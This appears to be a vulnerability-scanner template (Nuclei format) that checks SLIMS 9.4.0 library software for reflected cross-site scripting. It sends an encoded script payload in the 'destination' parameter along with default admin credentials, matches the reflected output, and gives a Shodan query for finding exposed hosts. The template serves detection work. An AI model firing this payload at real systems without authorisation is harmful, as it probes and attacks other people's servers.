id: slims-xss

info:
  name: Senayan Library Management System v9.4.0 a.k.a SLIMS 9 - Access Control
  author: arafatansari
  severity: medium
  description: |
    SLIMS 9 was discovered to contain `destination` request parameter that copies the value of an HTML tag attribute which is encapsulated in double quotation marks.
  reference:
    - https://packetstormsecurity.com/files/170182/Senayan-Library-Management-System-9.4.0-Cross-Site-Scripting.html
  metadata:
    shodan-query: http.html:"SLIMS"
    verified: "true"
  tags: xss,slims

requests:
  - raw:
      - |
        GET /index.php?p=member&destination=zbuip%22%3e%3cscript%3ealert(1)%3c%2fscript%3ejgoihbmmygl&memberID=admin&memberPassWord=password&_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&logMeIn=Login HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '<script>alert(1)</script>'
